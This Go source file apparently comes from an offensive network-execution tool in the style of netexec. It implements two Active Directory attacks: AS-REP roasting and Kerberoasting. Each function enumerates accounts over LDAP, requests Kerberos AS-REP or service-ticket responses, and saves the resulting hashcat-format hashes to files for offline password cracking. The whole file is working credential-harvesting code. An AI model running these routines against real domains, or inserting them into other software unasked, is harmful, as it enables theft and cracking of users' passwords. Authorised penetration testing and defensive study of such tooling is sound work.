package optldap

import (
	"github.com/5amu/gonetexec/internal/printer"
	"github.com/5amu/gonetexec/internal/utils"
	"github.com/mandiant/gopacket/pkg/kerberos"
)

func (o *Options) asreproast(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSComputerName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, _, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	var domain string = o.Connection.Domain
	if domain == "" {
		domain = o.target2SMBInfo[target].DNSDomainName
	}

	var hashes []string
	err = FindObjectsWithCallback(lclient, domain, o.filter, func(m map[string]interface{}) error {
		samaccountname, ok := m[SAMAccountName]
		if !ok {
			return nil
		}
		name := UnpackToString(samaccountname)
		
		hash, err := kerberos.GetASREP(name, domain, target, "hashcat")
		if err != nil {
			prt.StoreFailure(err.Error())
			return nil
		}
		
		prt.Store(name, hash)
		hashes = append(hashes, hash)
		return nil
	}, SAMAccountName)

	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	if len(hashes) == 0 {
		return
	}

	prt.Store("Saving hashes to", o.Hashes.AsrepRoast)
	err = utils.WriteLines(hashes, o.Hashes.AsrepRoast)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
}

func (o *Options) kerberoast(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSComputerName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, creds, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	var domain string = o.Connection.Domain
	if domain == "" {
		domain = o.target2SMBInfo[target].DNSDomainName
	}

	var hashes []string
	err = FindObjectsWithCallback(lclient, domain, o.filter, func(m map[string]interface{}) error {
		if len(m) == 0 {
			return nil
		}

		spnsToUnpack, ok := m[ServicePrincipalName]
		if !ok {
			return nil
		}
		spns := UnpackToSlice(spnsToUnpack)

		for i, spn := range spns {
			samaccountname, ok := m[SAMAccountName]
			if !ok {
				break
			}
			name := UnpackToString(samaccountname)

			res, err := kerberos.GetTGS(creds.Username, creds.Password, domain, target, name, spn)
			if err != nil {
				prt.StoreFailure(err.Error())
				return nil
			}

			prt.Store(name, res.Hash)

			if i == 0 {
				hashes = append(hashes, res.Hash)
			}
		}
		return nil

	}, SAMAccountName, ServicePrincipalName)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	if len(hashes) == 0 {
		return
	}

	prt.Store("Saving hashes to", o.Hashes.Kerberoast)
	err = utils.WriteLines(hashes, o.Hashes.Kerberoast)
	if err != nil {
		prt.StoreFailure(err.Error())
	}
}
